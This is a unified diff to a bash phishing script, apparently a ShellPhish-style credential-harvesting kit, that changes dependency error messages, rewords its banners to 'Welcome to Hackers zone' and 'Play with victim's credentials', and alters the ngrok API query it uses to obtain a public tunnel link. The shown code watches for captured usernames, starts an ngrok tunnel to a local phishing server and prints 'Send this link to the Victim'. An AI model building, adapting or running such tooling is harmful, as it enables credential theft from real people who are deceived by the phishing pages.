@@ -10,10 +10,10 @@ trap 'printf "\n";stop;exit 1' 2
 
 dependencies() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it by: apt install php. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it by: apt install wget. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it by: apt install unzip. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it by: apt install curl. Aborting."; exit 1; }
 
 }
 
@@ -100,12 +100,12 @@ exit 1
 }
 
 getcredentials() {
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]Welcome to Hackers zone pls Wait for credentials ...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "sites/$server/usernames.txt" ]]; then
-printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Play with victim's credentials !\n"
 catch_cred
 
 fi
@@ -252,7 +252,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnel | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
